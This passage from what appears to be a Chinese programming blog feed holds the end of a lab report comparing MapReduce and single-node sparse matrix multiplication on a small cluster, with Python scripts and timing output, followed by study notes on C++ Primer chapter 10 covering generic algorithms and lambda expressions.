file.</span><br></pre></td></tr></table></figure><p><img src="/2023/11/08/%E5%88%86%E5%B8%83%E5%BC%8F-%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%EF%BC%88B%EF%BC%89-lab2/image-20231108205436332.png" alt></p><h3 id="随机数组上的验证">随机数组上的验证</h3><h5 id="generate-matrix-py-生成随机数组并以稀疏矩形式保存">generate_matrix.py: 生成随机数组并以稀疏矩形式保存</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reslove_as_sparse_matrix</span>(<span class="params">which_mat, mat, f</span>):</span><br><span class="line">    <span class="built_in">print</span>(which_mat, mat.shape[<span class="number">0</span>], mat.shape[<span class="number">1</span>])</span><br><span class="line">    n1, n2 = mat.shape[<span class="number">0</span>], mat.shape[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n1):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n2):</span><br><span class="line">            <span class="keyword">if</span> (mat[i][j] != <span class="number">0</span>):</span><br><span class="line">                f.write(<span class="string">&quot;&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(which_mat, i + <span class="number">1</span>, j + <span class="number">1</span>, mat[i][j]))</span><br><span class="line"></span><br><span class="line">m_p_n = np.random.randint(low=<span class="number">100</span>, high=<span class="number">200</span>, size=<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(m_p_n)</span><br><span class="line">m, p, n = m_p_n[<span class="number">0</span>], m_p_n[<span class="number">1</span>], m_p_n[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test/input_&#123;&#125;_&#123;&#125;_&#123;&#125;_.txt&quot;</span>.<span class="built_in">format</span>(m, p, n), <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    mask_A = np.where(np.random.rand(m, p) &lt; <span class="number">0.1</span>, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    mat_A = np.random.randint(-<span class="number">0x3f3f</span>, <span class="number">0x3f3f</span>, (m, p))</span><br><span class="line">    mat_A = mask_A * mat_A</span><br><span class="line">    reslove_as_sparse_matrix(<span class="string">&#x27;A&#x27;</span>, mat_A, f)</span><br><span class="line"></span><br><span class="line">    mask_B = np.where(np.random.rand(p, n) &lt; <span class="number">0.1</span>, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    mat_B = np.random.randint(-<span class="number">0x3f3f</span>, <span class="number">0x3f3f</span>, (p, n))</span><br><span class="line">    mat_B = mask_B * mat_B</span><br><span class="line">    reslove_as_sparse_matrix(<span class="string">&#x27;B&#x27;</span>, mat_B, f)</span><br></pre></td></tr></table></figure><h5 id="process-on-single-node-py-单机矩阵乘法验证">process_on_single_node.py: 单机矩阵乘法验证</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">argv = sys.argv</span><br><span class="line">argc = <span class="built_in">len</span>(argv) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">input_file = argv[<span class="number">1</span>]</span><br><span class="line">input_file_parts = input_file.split(<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">m, p, n = <span class="built_in">int</span>(input_file_parts[<span class="number">1</span>]), <span class="built_in">int</span>(input_file_parts[<span class="number">2</span>]), <span class="built_in">int</span>(input_file_parts[<span class="number">3</span>])</span><br><span class="line">mat_A, mat_B = np.zeros((m, p), dtype=<span class="built_in">int</span>), np.zeros((p, n), dtype=<span class="built_in">int</span>)</span><br><span class="line"><span class="comment"># Resolve input into numpy</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(input_file):</span><br><span class="line">    line_4_parts = line.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    which_mat, i, j, val = line_4_parts[<span class="number">0</span>], <span class="built_in">int</span>(line_4_parts[<span class="number">1</span>]), <span class="built_in">int</span>(line_4_parts[<span class="number">2</span>]), <span class="built_in">int</span>(line_4_parts[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">if</span> which_mat == <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">      mat_A[i - <span class="number">1</span>][j - <span class="number">1</span>] = val</span><br><span class="line">    <span class="keyword">elif</span> which_mat == <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">      mat_B[i - <span class="number">1</span>][j - <span class="number">1</span>] = val</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mat_C = mat_A.dot(mat_B)</span><br><span class="line">n1, n2 = mat_C.shape[<span class="number">0</span>], mat_C.shape[<span class="number">1</span>]</span><br><span class="line"><span class="comment"># Reslove output into file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test/output_single_&#123;&#125;_&#123;&#125;_&#123;&#125;_.txt&quot;</span>.<span class="built_in">format</span>(m, p, n), <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n1):</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n2):</span><br><span class="line">          <span class="keyword">if</span> (mat_C[i][j] != <span class="number">0</span>):</span><br><span class="line">              f.write(<span class="string">&quot;&#123;&#125;,&#123;&#125;,&#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(i + <span class="number">1</span>, j + <span class="number">1</span>, mat_C[i][j]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="对比">对比</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">xxxxxxxxxx@thumm01:~/lab2/MyDFS$ python client.py -MapReduce <span class="built_in">test</span>/input_111_182_134_.txt <span class="built_in">test</span>/output_111_182_134_.txt</span><br><span class="line">165 <span class="built_in">test</span>/output_165_147_144_.txt</span><br><span class="line">Request: new_fat_item <span class="built_in">test</span>/input_165_147_144_.txt </span><br><span class="line">Fat: </span><br><span class="line">blk_no,host_name,blk_size</span><br><span class="line">0,[<span class="string">&#x27;thumm06&#x27;</span> <span class="string">&#x27;thumm05&#x27;</span> <span class="string">&#x27;thumm04&#x27;</span>],4089</span><br><span class="line">1,[<span class="string">&#x27;thumm06&#x27;</span> <span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm05&#x27;</span>],4085</span><br><span class="line">2,[<span class="string">&#x27;thumm05&#x27;</span> <span class="string">&#x27;thumm03&#x27;</span> <span class="string">&#x27;thumm04&#x27;</span>],4092</span><br><span class="line">3,[<span class="string">&#x27;thumm05&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span> <span class="string">&#x27;thumm04&#x27;</span>],4089</span><br><span class="line">4,[<span class="string">&#x27;thumm03&#x27;</span> <span class="string">&#x27;thumm04&#x27;</span> <span class="string">&#x27;thumm01&#x27;</span>],4095</span><br><span class="line">5,[<span class="string">&#x27;thumm05&#x27;</span> <span class="string">&#x27;thumm03&#x27;</span> <span class="string">&#x27;thumm04&#x27;</span>],4087</span><br><span class="line">6,[<span class="string">&#x27;thumm05&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span> <span class="string">&#x27;thumm03&#x27;</span>],4096</span><br><span class="line">7,[<span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm03&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span>],4092</span><br><span class="line">8,[<span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm04&#x27;</span> <span class="string">&#x27;thumm03&#x27;</span>],4091</span><br><span class="line">9,[<span class="string">&#x27;thumm04&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span> <span class="string">&#x27;thumm01&#x27;</span>],4087</span><br><span class="line">10,[<span class="string">&#x27;thumm06&#x27;</span> <span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm04&#x27;</span>],4091</span><br><span class="line">11,[<span class="string">&#x27;thumm05&#x27;</span> <span class="string">&#x27;thumm03&#x27;</span> <span class="string">&#x27;thumm04&#x27;</span>],4085</span><br><span class="line">12,[<span class="string">&#x27;thumm05&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span> <span class="string">&#x27;thumm01&#x27;</span>],4085</span><br><span class="line">13,[<span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm04&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span>],4091</span><br><span class="line">14,[<span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm04&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span>],4096</span><br><span class="line">15,[<span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span> <span class="string">&#x27;thumm04&#x27;</span>],3286</span><br><span class="line"></span><br><span class="line">Finish CopyFromLocal</span><br><span class="line">Finish Reduce</span><br><span class="line">Finish writing to output file.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xxxxxxxxxx@thumm01:~/lab2/MyDFS$ python process_on_single_node.py <span class="built_in">test</span>/input_111_182_134_.txt</span><br></pre></td></tr></table></figure><p><img src="/2023/11/08/%E5%88%86%E5%B8%83%E5%BC%8F-%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%EF%BC%88B%EF%BC%89-lab2/image-20231108205929855.png" alt></p><p>如图所示，结果一致。</p><h1 id="Bonus">Bonus</h1><p>Q：请对比一下单机处理矩阵乘法以及你自己设计的 mapreduce 矩阵乘法的时间性能，并解释为什么<br>会出现这样的情况</p><p>使用time对比时间性能如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">xxxxxxxxxx@thumm01:~/lab2/MyDFS$ time python client.py -MapReduce <span class="built_in">test</span>/input_111_182_134_.txt <span class="built_in">test</span>/output_111_182_134_.txt</span><br><span class="line">111 <span class="built_in">test</span>/output_111_182_134_.txt</span><br><span class="line">Request: new_fat_item <span class="built_in">test</span>/input_111_182_134_.txt </span><br><span class="line">Fat: </span><br><span class="line">blk_no,host_name,blk_size</span><br><span class="line">0,[<span class="string">&#x27;thumm06&#x27;</span> <span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm03&#x27;</span>],4087</span><br><span class="line">1,[<span class="string">&#x27;thumm03&#x27;</span> <span class="string">&#x27;thumm05&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span>],4094</span><br><span class="line">2,[<span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm05&#x27;</span> <span class="string">&#x27;thumm03&#x27;</span>],4090</span><br><span class="line">3,[<span class="string">&#x27;thumm06&#x27;</span> <span class="string">&#x27;thumm04&#x27;</span> <span class="string">&#x27;thumm01&#x27;</span>],4091</span><br><span class="line">4,[<span class="string">&#x27;thumm05&#x27;</span> <span class="string">&#x27;thumm04&#x27;</span> <span class="string">&#x27;thumm03&#x27;</span>],4084</span><br><span class="line">5,[<span class="string">&#x27;thumm06&#x27;</span> <span class="string">&#x27;thumm05&#x27;</span> <span class="string">&#x27;thumm03&#x27;</span>],4085</span><br><span class="line">6,[<span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm04&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span>],4087</span><br><span class="line">7,[<span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm04&#x27;</span> <span class="string">&#x27;thumm03&#x27;</span>],4094</span><br><span class="line">8,[<span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm03&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span>],4086</span><br><span class="line">9,[<span class="string">&#x27;thumm06&#x27;</span> <span class="string">&#x27;thumm03&#x27;</span> <span class="string">&#x27;thumm05&#x27;</span>],4090</span><br><span class="line">10,[<span class="string">&#x27;thumm04&#x27;</span> <span class="string">&#x27;thumm03&#x27;</span> <span class="string">&#x27;thumm05&#x27;</span>],4089</span><br><span class="line">11,[<span class="string">&#x27;thumm04&#x27;</span> <span class="string">&#x27;thumm05&#x27;</span> <span class="string">&#x27;thumm03&#x27;</span>],4091</span><br><span class="line">12,[<span class="string">&#x27;thumm06&#x27;</span> <span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm04&#x27;</span>],4093</span><br><span class="line">13,[<span class="string">&#x27;thumm04&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span> <span class="string">&#x27;thumm01&#x27;</span>],4092</span><br><span class="line">14,[<span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span> <span class="string">&#x27;thumm03&#x27;</span>],4090</span><br><span class="line">15,[<span class="string">&#x27;thumm04&#x27;</span> <span class="string">&#x27;thumm05&#x27;</span> <span class="string">&#x27;thumm03&#x27;</span>],2781</span><br><span class="line"></span><br><span class="line">Finish CopyFromLocal</span><br><span class="line">Finish Reduce</span><br><span class="line">Finish writing to output file.</span><br><span class="line"></span><br><span class="line">real    0m16.871s</span><br><span class="line">user    0m2.780s</span><br><span class="line">sys     0m0.988s</span><br><span class="line">xxxxxxxxxx@thumm01:~/lab2/MyDFS$ time python process_on_single_node.py <span class="built_in">test</span>/input_111_182_134_.txt</span><br><span class="line"></span><br><span class="line">real    0m0.259s</span><br><span class="line">user    0m0.692s</span><br><span class="line">sys     0m0.768s</span><br></pre></td></tr></table></figure><p>可以看到MapReduce几乎是单机程序的60倍左右，出现这种问题的原因是，虽然Map在多机上运行能通过并行提高效率，但是与name_node和data_node的网络通信才是性能瓶颈。</p><blockquote><p>本实验中中MapReduce和单机程序还有许多可以优化的地方。<br>MapReduce 中Client分发Map任务时可以使用使用多进程或者多线程。<br>单机程序可以使用<strong>矩阵分块</strong>技术写出缓存友好的代码，可以使用多线程CPU和GP计算矩阵乘法。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
          <category> 大数据系统基础（B） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第10章 泛型算法</title>
      <link href="/2023/11/01/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch10/"/>
      <url>/2023/11/01/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch10/</url>
      
        <content type="html"><![CDATA[<h2 id="泛型算法">泛型算法</h2><ul><li><p>因为它们实现共同的操作，所以称之为“<strong>算法</strong>”；而“<strong>泛型</strong>”指的是它们可以操作在多种容器类型上。<br>算法通过在<strong>迭代器</strong>上进行操作来实现类型无关。</p></li><li><p><strong>泛型算法本身不执行容器操作，只是单独依赖迭代器和迭代器操作实现。</strong></p></li><li><p>头文件： <code>#include &lt;algorithm&gt;</code>或者 <code>#include &lt;numeric&gt;</code>(算数相关)</p></li><li><p>大多数算法是通过遍历两个迭代器标记的一段元素来实现其功能。</p></li><li><p>必要的编程假定：<strong>算法永远不会改变底层容器的大小。算法可能改变容器中保存的元素的值，也可能在容器内移动元素，但不能直接添加或者删除元素。</strong></p><blockquote><p>标准库定义了一类特殊的迭代器，称为插入器（inserter）。<br>当一个算法操作这样一个迭代器时，迭代器可以完成向容器添加元素的操作，但算法自身永远不会做这样的操作。</p></blockquote></li></ul><h3 id="find">find</h3><ul><li><code>vector&lt;int&gt;::const_iterator result = find(vec.begin(), vec.end(), search_value);</code></li><li>输入：两个标记范围的迭代器和目标查找值。返回：如果找到，返回对应的迭代器，否则返回第二个参数，即标记结尾的迭代器。</li></ul><h2 id="初识泛型算法">初识泛型算法</h2><ul><li>标准库提供了超过100个算法，但这些算法有一致的结构。</li><li>理解算法的最基本的方法是了解它们是否读取元素、改变元素、重排元素顺序。</li></ul><h3 id="只读算法">只读算法</h3><ul><li><p>只读取范围中的元素，不改变元素。</p></li><li><p>如 <code>find</code>和 <code>accumulate</code>（在<code>numeric</code>中定义，求和）。</p><blockquote><p><code>int sum = accumulate(vec.cbegin(), vec.cend(), 0)</code> 注意第3个参数决定了函数使用哪个加法运算符以及返回值的类型。</p><p>要求序列中的元素必须和第三个参数匹配，或者能转换成第三个参数的类型。</p><p>比如：<code>string sum = accumulate(v.cbegin(), v.cend(), &quot;&quot;)</code>  是错误的，因为const char* 并没有定义+运算符，此调用将会产生编译错误。需要把&quot;“换为string(”&quot;)。</p></blockquote></li><li><p><code>find_first_of</code>，输入：两对迭代器标记两段范围，在第一段中找第二段中任意元素，返回第一个匹配的元素，找不到返回第一段的<code>end</code>迭代器。</p></li><li><p>通常最好使用<code>cbegin</code>和<code>cend</code>。</p></li><li><p><code>equal</code>：确定两个序列是否保存相同的值。</p><blockquote><p><code>equal(roster1.cbegin(), roster1.cend(), roster2.cbegin())</code><br>其中roster2的元素数目至少和roster1一样多<br>由于equal使用迭代器完成操作，元素类型不必一样，只要我们能使用==比较两个元素类型是否一致即可。</p></blockquote></li></ul><h4 id="练习10-4">练习10.4</h4><p>Q：假定 <code>v</code> 是一个<code>vector&lt;double&gt;</code>，那么调用 <code>accumulate(v.cbegin(),v.cend(),0)</code> 有何错误（如果存在的话）？<br>A：元素将被转为int后再执行+</p><h4 id="练习10-5">练习10.5</h4><p>Q：在本节对名册（<code>roster</code>）调用<code>equal</code>的例子中，如果两个名册中保存的都是C风格字符串而不是<code>string</code>，会发生什么？</p><p>A：C风格字符串是用指向字符的指针表示的，因此会比较两个指针的值（地址），而不会比较这两个字符串的内容。</p><h3 id="写容器元素的算法">写容器元素的算法</h3><ul><li><p>一些算法将新值赋予序列中的元素。</p></li><li><p>算法不检查写操作。</p></li><li><p><code>fill</code>： <code>fill(vec.begin(), vec.end(), 0);</code> 将每个元素重置为0。</p></li><li><p><code>fill_n</code>： <code>fill_n(vec.begin(), 10, 0);</code> 假定目的位置足够大，能容纳写入的元素。</p><blockquote><p>注意：算法永远不会改变底层容器的大小，不能添加或删除元素。</p><p>一个初学者非常容易犯的错误是在一个空容器上调用 <code>fill_n</code>（或类似的写元素操作），这条语句的结果是未定义的。</p><p>注意：泛型算法对容器要的要求并非是足够的空间，而是<strong>足够的元素</strong>。<br>使用<code>reserve()</code>只是分配空间，并未添加元素，而算法不能添加元素，所以要改为在<code>resize()</code>后才能添加元素。</p></blockquote></li><li><p>插入迭代器<code>back_inserter</code>：</p><ul><li>用来确保算法有足够的空间存储数据。</li><li><code>#include &lt;iterator&gt;</code></li><li><code>back_inserter(vec)</code> 返回与容器绑定的插入迭代器</li></ul></li><li><p>拷贝算法<code>copy</code></p><ul><li>输入：前两个参数指定输入范围，第三个指向目标序列。</li><li><code>copy(ilst.begin(), ilst.end(), back_inserter(ivec));</code></li><li>必须保证目标目的序列至少要包含与输入序列一样多的元素。</li><li>返回的是目的位置迭代器（递增后）的值</li></ul></li><li><p>多个算法提供”拷贝“版本，会创建一个新序列保存结果<br><code>replace(ilst.begin(), ilst.end(), 0, 42)</code> 序列汇总0都替换为42<br><code>replace_copy(ilst.cbegin(), ilst.cend(), back_insecter(ivec), 0, 42)</code> 第3个参数指出调整后序列的保存位置。</p></li></ul><h4 id="练习10-7">练习10.7</h4><p>Q：下面程序是否有错误？如果有，请改正：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(a) vector&lt;<span class="type">int</span>&gt; vec; list&lt;<span class="type">int</span>&gt; lst; <span class="type">int</span> i;</span><br><span class="line"><span class="keyword">while</span> (cin &gt;&gt; i)</span><br><span class="line">lst.<span class="built_in">push_back</span>(i);</span><br><span class="line"><span class="built_in">copy</span>(lst.<span class="built_in">cbegin</span>(), lst.<span class="built_in">cend</span>(), vec.<span class="built_in">begin</span>());</span><br><span class="line">(b) vector&lt;<span class="type">int</span>&gt; vec;</span><br><span class="line">vec.<span class="built_in">reserve</span>(<span class="number">10</span>);</span><br><span class="line"><span class="built_in">fill_n</span>(vec.<span class="built_in">begin</span>(), <span class="number">10</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>A: (a) 应该加一条语句 <code>vec.resize(lst.size())</code> 。<code>copy</code>时必须保证目标目的序列至少要包含与输入序列一样多的元素。<br>(b) reserve分配了足够的空间，但是不会创建新元素。算法可能改变容器中保存的元素的值，也可能在容器内移动元素，永远不会直接添加和删除元素，所以此处应该改为resize(10)。</p><h3 id="重排容器元素的算法">重排容器元素的算法</h3><ul><li><p>这些算法会重排容器中元素的顺序。</p></li><li><p>排序算法<code>sort</code>：</p><ul><li>接受两个迭代器，表示要排序的元素范围。</li></ul></li><li><p>消除重复<code>unique</code>：</p><ul><li><p><strong>要先调用<code>sort</code></strong>。</p></li><li><p>返回的迭代器指向最后一个不重复元素之后的位置。</p></li><li><p>顺序会变，重复的元素被“删除”。</p></li><li><p>并没有真正删除，标准库算法是对迭代器操作而非容器，<strong>只有容器操作才能删除元素</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sort</span>(words.<span class="built_in">begin</span>(), words.<span class="built_in">end</span>());</span><br><span class="line">words.<span class="built_in">erase</span>(<span class="built_in">unique</span>(words.<span class="built_in">begin</span>(), words.<span class="built_in">end</span>()), words.<span class="built_in">end</span>());</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="练习10-10">练习10.10</h4><p>Q：你认为算法不改变容器大小的原因是什么？</p><p>A：</p><ul><li>算法根本不知道容器的存在，它与容器的成员函数是分开的</li><li>算法操作的是迭代器</li></ul><h2 id="定制操作">定制操作</h2><h3 id="向算法传递函数">向算法传递函数</h3><ul><li><p>谓词（<code>predicate</code>）：</p><ul><li>是一个<strong>可调用的表达式</strong>，返回结果是一个能用作条件的值</li><li>一元谓词：接受一个参数</li><li>二元谓词：接受两个参数</li></ul></li><li><p>例子：</p><ul><li><code>stable_sort</code>：<ul><li>排序算法的稳定性：保留相等元素的原始相对位置。</li><li><code>stable_sort(words.begin(), words.end(), isShorter);</code></li></ul></li></ul></li></ul><h3 id="lambda表达式">lambda表达式</h3><ul><li><p>有时可能希望<strong>操作可以接受更多的参数</strong>。</p></li><li><p><code>lambda</code>表达式表示一个可调用的代码单元，可以理解成是一个未命名的内联函数。</p><blockquote><p>目前已经学过4种可调用对象：</p><ul><li>函数</li><li>函数指针</li><li>冲在了函数调用符的类</li><li>lambda表达式</li></ul></blockquote></li><li><p>形式：<strong><code>[capture list](parameter list) -&gt; return type &#123;function body&#125;</code></strong>。</p><ul><li>其中<code>capture list</code>捕获列表是一个<code>lambda</code>所在函数定义的局部变量的列表（通常为空）。<strong>不可忽略</strong>。</li><li><code>return type</code>是返回类型，必须尾置。可忽略，但<strong>最好不要忽略：如果函数体非只有一条语句，就不能判断返回类型，会默认返回void。</strong></li><li><code>parameter</code>是参数列表。可忽略。</li><li><code>function body</code>是函数体。不可忽略。</li><li><code>auto f = [] &#123;return 42;&#125;</code></li></ul></li><li><p>lambda不能有默认参数。</p></li><li><p>一个lambda只有在其捕获列表中捕获一个它所在函数中的局部变量，才能在函数体中使用该变量。</p></li><li><p>捕获列表只用于局部非static变量，lambda可以直接使用局部static变量和它所在函数之外声明的名字。</p></li><li><p>例子：</p><ul><li><code>find_if</code>:<ul><li>接受一对表示范围的迭代器和一个谓词，用来查找第一个满足特定要求的元素。返回第一个使谓词返回非0值的元素。</li><li><code>auto wc = find_if(words.begin(), words.end(), [sz](const string &amp;a)&#123;return a.size() &gt;= sz;&#125;);</code></li></ul></li><li><code>for_each</code>：<ul><li>接受一个可调用对象，并对序列中每个元素调用此对象。</li><li><code>for_each(wc, words.end(), [](const string &amp;s)&#123;cout &lt;&lt; s &lt;&lt; &quot; &quot;;&#125;)</code></li></ul></li></ul></li></ul><h3 id="lambda捕获和返回">lambda捕获和返回</h3><ul><li><p>定义<code>lambda</code>时会生成一个<strong>新的类类型</strong>和该类型的<strong>一个对象</strong>。</p></li><li><p>默认情况下，从<code>lambda</code>生成的类都包含一个对应该<code>lambda</code>所捕获的变量的数据成员，在<code>lambda</code>对象创建时被初始化。</p></li><li><p><strong>值捕获</strong>：前提是变量可以拷贝，<code>size_t v1 = 42; auto f = [v1] &#123;return v1;&#125;;</code>。</p></li><li><p><strong>引用捕获</strong>：必须保证在<code>lambda</code>执行时，变量是存在的，<code>auto f2 = [&amp;v1] &#123;return v1;&#125;;</code></p><blockquote><p>尽量减少捕获的数据量，尽可能避免捕获指针或引用。</p></blockquote></li><li><p><strong>隐式捕获</strong>：让编译器推断捕获列表，在捕获列表中写一个<code>&amp;</code>（引用方式）或<code>=</code>（值方式）：<code>auto f3 = [=] &#123;return v1;&#125;</code></p></li></ul><p><strong>lambda捕获列表</strong>：</p><table><thead><tr><th>捕获列表</th><th>解释</th></tr></thead><tbody><tr><td><code>[]</code></td><td>空捕获列表。<code>lambda</code>不能使用所在函数中的变量。一个<code>lambda</code>只有在捕获变量后才能使用它们。</td></tr><tr><td><code>[names]</code></td><td><code>names</code>是一个逗号分隔的名字列表，这些名字都是在<code>lambda</code>所在函数的局部变量，捕获列表中的变量都被拷贝，名字前如果使用了<code>&amp;</code>，则采用引用捕获方式。</td></tr><tr><td><code>[&amp;]</code></td><td>隐式捕获列表，采用引用捕获方式。<code>lambda</code>体中所使用的来自所在函数的实体都采用引用方式使用。</td></tr><tr><td><code>[=]</code></td><td>隐式捕获列表，采用值捕获方式。</td></tr><tr><td><code>[&amp;, identifier_list]</code></td><td><code>identifier_list</code>是一个逗号分隔的列表，包含0个或多个来自所在函数的变量。这些变量采用值捕获方式，而任何隐式捕获的变量都采用引用方式捕获。<code>identifier_list</code>中的名字前面不能使用<code>&amp;</code></td></tr><tr><td><code>[=, identifier_list]</code></td><td><code>identifier_list</code>中的变量采用引用方式捕获，而任何隐式捕获的变量都采用值方式捕获。<code>identifier_list</code>中的名字不能包括<code>this</code>，且前面必须使用<code>&amp;</code></td></tr></tbody></table><ul><li><p><strong>可变lambda</strong>：若希望能改变一个被捕获的变量的值，则必须在参数列表后加上关键词<code>mutable</code>，如<code>auto f = [v1] () mutable &#123;return ++v1;&#125;</code>。</p></li><li><p><strong>指定lambda返回类型</strong>：<mark>默认情况下，如果一个lambda体包含return以外的任何语句，则编译器假定此lambda返回void</mark>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误: 不能推断lambda的返回类型</span></span><br><span class="line"><span class="built_in">transform</span>(vi.<span class="built_in">begin</span>(), vi.<span class="built_in">end</span>(), vi.<span 